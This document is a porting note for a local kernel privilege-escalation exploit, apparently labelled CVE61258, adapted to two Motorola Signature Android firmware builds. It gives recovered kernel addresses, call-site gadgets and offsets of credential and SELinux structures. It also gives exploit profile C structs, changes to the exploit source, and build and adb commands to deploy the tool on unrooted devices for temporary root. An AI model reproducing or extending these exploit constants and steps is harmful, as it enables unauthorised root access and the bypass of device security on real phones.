# Motorola Signature (`kernel-msm` `android-17-release-a171wvh.21-16-16`) `6.12.58` Port

No pre-existing root is required on the target device. Two OTA generations are supported:

| OTA | GKI build | GKI tag | `uname -r` |
|---|---|---|---|
| Initial shipping | `ab14987696` | `android16-6.12-2025-12_r26` | `6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k` |
| Post-OTA update | `ab15950084` | `android16-6.12-2025-12_r59` | `6.12.58-android16-6-g09eda8c8505a-ab15950084-4k` |

Kernel symbols and BTF constants are recovered directly from the official GKI distribution image (no root needed).

## Target & Image Provenance

- Vendor kernel tree: `MotorolaMobilityLLC/kernel-msm` branch `android-17-release-a171wvh.21-16-16` (Snapdragon `canoe` / SM8850 platform)
- KMI: `android16-6.12`

### r26 (ab14987696 — initial firmware)
- Official GKI image: `https://dl.google.com/android/gki/gki-certified-boot-android16-6.12-2025-12_r26.zip`
  - `boot-6.12.img`: `67,108,864` bytes, SHA-256 `eedf76b48dbe0e4225cadefac1837f03c38445af304916af964a9e446b23e8d7`
  - Unpacked `kernel`: `41,232,896` bytes, SHA-256 `33c44639ade31412c6af32df40b8cab4fe4cfd21d3f80e4ef6a06cfde9ee21b2`
  - Kernel banner: `Linux version 6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k ... #1 SMP PREEMPT Fri Mar  6 03:47:51 UTC 2026`

### r59 (ab15950084 — post-OTA, 2026-10-01 security patch)
- Official GKI image: `https://dl.google.com/android/gki/gki-certified-boot-android16-6.12-2025-12_r59.zip`
  - `boot-6.12.img`: `67,108,864` bytes, SHA-256 `6939d481e2c1756ed3dee2606aef624131d991c8a552d0b862be11cd4d546aa0`
  - Unpacked `kernel`: `41,306,624` bytes, SHA-256 `fe3ef36476044dcbdb0f281143793199edbbd75acd1d0fa401f35d99005bda6c`
  - Kernel banner: `Linux version 6.12.58-android16-6-g09eda8c8505a-ab15950084-4k (kleaf@build-host) ... #1 SMP PREEMPT Mon Jul 27 12:15:30 UTC 2026`

## `kallsyms` & BTF Extraction Results

### r26 (ab14987696)

- `kallsyms`: `n=128244`, `base=0xffffffc080000000`, `shift=+0`
- `do_timer_create` (`0xffffffc080517ff8`) → timer_site `0xffffffc0805180a4` (`low21=0x1180a4`, `low16=0x80a4`, unique)
- `copy_process` (`0xffffffc080156b14`) → copy_site `0xffffffc080156c70` (`low21=0x156c70`, `low16=0x6c70`, unique)

```c
{
    "6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k",
    0xffffffc0805180a4ULL, 0x1180a4ULL, 0x156c70ULL,
    0xffffffc0827b4648ULL, 0xffffffc08251afe0ULL, 0ULL,
    0xffffffc082542360ULL, 0xffffffc0825420e8ULL,
    0xffffffc082543cf8ULL, 0xffffffc082543828ULL, 0xffffULL, 0,
},
```

### r59 (ab15950084)

- `kallsyms`: `n=128887`, `base=0xffffffc080000000`, `shift=+1`
- `do_timer_create` (`0xffffffc080517698`) → timer_site `0xffffffc080517744` (`low21=0x117744`, `low16=0x7744`, **unique at all three masks**)
- `copy_process` (`0xffffffc0801d72f8`) → copy_site `0xffffffc0801d7440` (`low21=0x1d7440`, `low16=0x7440`, **unique at all three masks**)

```c
{
    /* GKI android16-6.12-2025-12_r59, build ab15950084, Jul 27 2026
     * Verified from gki-certified-boot-android16-6.12-2025-12_r59.zip
     * timer_site unique at low16/low21/low12; copy_site unique at all three masks */
    "6.12.58-android16-6-g09eda8c8505a-ab15950084-4k",
    0xffffffc080517744ULL, 0x117744ULL, 0x1d7440ULL,
    0xffffffc0827c69a0ULL, 0xffffffc08252afe0ULL, 0ULL,
    0xffffffc082552370ULL, 0xffffffc0825520f8ULL,
    0xffffffc082553d08ULL, 0xffffffc082553838ULL, 0xffffULL, 0,
},
```

BTF & `IKCFG` checks (identical for both r26 and r59):

- `k_itimer`: `size=0x100`, `it=0x78`, `sigq=0x70`, `it_requeue_pending=0x50`
- `cred`: `size=0xb8`, `uid=0x8`
- `task_struct`: `size=0x1440`, `cred=0x900`
- `selinux_state`: `size=0x80`, `enforcing=0x0`
- `task_security_struct`: `size=0x18`, `exec_sid=0x8`, `create_sid=0xc`
- `tracepoint`: `size=0x50`, `funcs=0x48`
- Static data: `root_user` (`usage=1, uid=0`), `panic_on_warn=0`
- `IKCFG`: `CONFIG_LTO_NONE=y`, `CONFIG_CFI_CLANG=y`, `CONFIG_CFI_ICALL_NORMALIZE_INTEGERS=y`, `# CONFIG_MODULE_SIG_FORCE is not set`, `CONFIG_FTRACE=y`, `CONFIG_MEM_ALLOC_PROFILING=y`

## Code Changes

1. `exploit/src/K61258_plant.c`:
   - Added the `6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k` profile (`vr = 0`, `sys_exit = 0ULL`).
   - Added the `6.12.58-android16-6-g09eda8c8505a-ab15950084-4k` profile (r59, same `vr=0`, `sys_exit=0ULL`).
   - Added per-profile `site_mask` to `struct k61258_profile`: existing targets keep `0x1fffffULL`, while Motorola targets (`ab14987696`, `ab15950084`) use `0xffffULL` (live hardware KASLR slide is 20-bit aligned; both timer_site and copy_site are unique call sites).
2. `exploit/src/plant_core.inc`:
   - Added configurable `SITE_MASK` macro.
   - Added `ensure_trace_buffer_size()`: Motorola defaults `/sys/kernel/tracing/buffer_size_kb` to `7` KB; expands values `< 2048` KB to `4096` KB.
3. `exploit/rust-kplant/src/main.rs`: Added `is_motorola_device()` to skip OPPO/ColorOS-only steps.
4. `app/app/src/main/java/com/shark/kty/MainActivity.kt`:
   - Registered both Motorola kernel versions in `PROFILE_BY_RELEASE` → `ExploitKind.CVE61258`.
   - Added `isMotorolaDevice()` guards.

## Building & Read-Only Device Probe

1. Rebuild `libk61258.so` (requires Android NDK + Rust `aarch64-linux-android` target):

```bash
export ANDROID_NDK_HOME=/path/to/ndk
cd exploit/rust-kplant
CARGO_TARGET_DIR=target/k61258 cargo build --release --target aarch64-linux-android \
    --no-default-features --features k61258
cp target/k61258/aarch64-linux-android/release/kplant \
    ../../app/app/src/main/jniLibs/arm64-v8a/libk61258.so
```

2. Run the read-only `probe` over ADB (does not write kernel memory):

```bash
adb push app/app/src/main/jniLibs/arm64-v8a/libk61258.so /data/local/tmp/k61258_test
adb shell chmod 755 /data/local/tmp/k61258_test
adb shell /data/local/tmp/k61258_test probe
```

Verify output contains `PROFILE_61258=6.12.58-android16-6-g09eda8c8505a-ab15950084-4k` (or the r26 string), `PROBE_SLIDE=... aligned=1`, and `PROBE_OK`.

3. Build the release APK:

```bash
cd app && ./gradlew :app:assembleRelease
```

## Status

- [x] GKI r26 image extraction, `kallsyms`/BTF/`IKCFG` constant recovery, disassembly verification (`2026-11-12`)
- [x] GKI r59 image extraction, `kallsyms`/BTF/`IKCFG` constant recovery, disassembly verification (`2026-11-12`)
- [x] Rebuilt `app/app/src/main/jniLibs/arm64-v8a/libk61258.so` with Android NDK r28c + Rust
- [x] Live read-only `probe` passed on unrooted device (r26, `PROBE_OK`, KASLR `aligned=1`)
- [ ] Live read-only `probe` on r59 device (`ab15950084`) — pending rebuild
- [ ] Full in-app temporary-root end-to-end verification on device
